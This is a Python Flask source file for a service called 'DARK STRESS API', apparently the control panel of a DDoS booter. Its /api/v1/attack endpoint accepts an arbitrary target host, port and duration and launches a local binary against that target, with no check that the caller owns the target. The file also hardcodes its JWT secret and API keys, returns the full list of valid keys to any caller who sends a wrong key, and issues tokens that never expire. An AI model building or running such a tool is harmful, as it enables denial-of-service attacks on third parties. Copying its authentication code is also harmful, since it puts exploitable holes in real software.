from flask import Flask, request, jsonify
from flask_cors import CORS
import jwt
import subprocess
import os
import random
import string
import stat
import threading
from datetime import datetime
from functools import wraps

app = Flask(__name__)
CORS(app)

# ==================== CONFIG ====================
app.config['SECRET_KEY'] = 'super_secret_key_123'
BINARY_PATH = "/app/soul"  # Railway pe binary yaha rakhna

# Valid API keys (Lifetime)
VALID_API_KEYS = ["test123", "admin", "darkdevil"]
REVOKED_TOKENS = set()

# ==================== FIX BINARY PERMISSION ====================
def fix_binary_permission():
    if os.path.exists(BINARY_PATH):
        try:
            os.chmod(BINARY_PATH, os.stat(BINARY_PATH).st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
            return True
        except:
            return False
    return False

def binary_ready():
    return os.path.exists(BINARY_PATH) and os.access(BINARY_PATH, os.X_OK)

# Fix permission on startup
fix_binary_permission()

# ==================== VERIFY TOKEN ====================
def verify_token(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        
        if not auth_header:
            return jsonify({'error': 'Unauthorized', 'message': 'Missing Authorization header'}), 401
        
        token = auth_header[7:] if auth_header.startswith('Bearer ') else auth_header
        
        if token in REVOKED_TOKENS:
            return jsonify({'error': 'Forbidden', 'message': 'Token revoked'}), 403
        
        try:
            jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'], options={'verify_exp': False})
            return f(*args, **kwargs)
        except:
            return jsonify({'error': 'Unauthorized', 'message': 'Invalid token'}), 401
    return decorated

# ==================== ENDPOINTS ====================
@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'online',
        'name': 'DARK STRESS API',
        'version': '3.0',
        'binary_ready': binary_ready(),
        'binary_path': BINARY_PATH if binary_ready() else None,
        'token_expiry': 'NEVER',
        'endpoints': {
            'auth': 'POST /api/auth',
            'attack': 'POST /api/v1/attack',
            'generate': 'POST /api/generate',
            'list_keys': 'GET /api/list_keys',
            'revoke': 'POST /api/revoke',
            'status': 'GET /api/status'
        }
    })

@app.route('/api/auth', methods=['POST'])
def auth():
    data = request.get_json()
    key = data.get('key') if data else None
    
    if not key:
        return jsonify({'error': 'Missing key', 'example': {'key': 'test123'}}), 400
    
    if key not in VALID_API_KEYS:
        return jsonify({'error': 'Invalid API key', 'valid_keys': VALID_API_KEYS}), 401
    
    token = jwt.encode({'apiKey': key, 'time': datetime.now().isoformat()}, app.config['SECRET_KEY'], algorithm='HS256')
    
    return jsonify({'success': True, 'token': token, 'expires_in': 'NEVER'})

@app.route('/api/v1/attack', methods=['POST'])
@verify_token
def attack():
    data = request.get_json()
    
    if not data:
        return jsonify({'error': 'Missing JSON body', 'example': {'target': 'example.com', 'port': 80, 'time': 60}}), 400
    
    target = data.get('target') or data.get('host') or data.get('url')
    
    if not target:
        return jsonify({'error': 'Missing target', 'example': {'target': 'example.com'}}), 400
    
    target = target.replace('http://', '').replace('https://', '').split('/')[0]
    port = data.get('port', 80)
    duration = data.get('time') or data.get('duration', 60)
    
    if not binary_ready():
        return jsonify({'error': 'Binary not ready', 'binary_path': BINARY_PATH}), 500
    
    def run():
        try:
            subprocess.Popen([BINARY_PATH, target, str(port), str(duration)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    
    threading.Thread(target=run).start()
    
    return jsonify({'success': True, 'message': 'Attack launched', 'target': target, 'port': port, 'duration': duration})

@app.route('/api/generate', methods=['POST'])
@verify_token
def generate():
    new_key = 'key_' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    VALID_API_KEYS.append(new_key)
    return jsonify({'success': True, 'api_key': new_key})

@app.route('/api/list_keys', methods=['GET'])
@verify_token
def list_keys():
    return jsonify({'success': True, 'api_keys': VALID_API_KEYS, 'count': len(VALID_API_KEYS)})

@app.route('/api/revoke', methods=['POST'])
@verify_token
def revoke():
    data = request.get_json()
    api_key = data.get('api_key') if data else None
    
    if not api_key:
        return jsonify({'error': 'Missing api_key'}), 400
    
    if api_key in VALID_API_KEYS:
        VALID_API_KEYS.remove(api_key)
        return jsonify({'success': True, 'message': 'API key revoked'})
    
    return jsonify({'error': 'API key not found'}), 404

@app.route('/api/status', methods=['GET'])
@verify_token
def status():
    return jsonify({
        'success': True,
        'status': 'running',
        'binary_ready': binary_ready(),
        'total_keys': len(VALID_API_KEYS),
        'revoked_tokens': len(REVOKED_TOKENS)
    })

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Not Found', 'endpoint': request.path}), 404

if __name__ == '__main__':
    print("=" * 50)
    print("🔥 DARK STRESS API RUNNING")
    print(f"🔑 Keys: {VALID_API_KEYS}")
    print(f"💀 Binary: {binary_ready()}")
    print("=" * 50)
    app.run(host='0.0.0.0', port=3000, debug=False)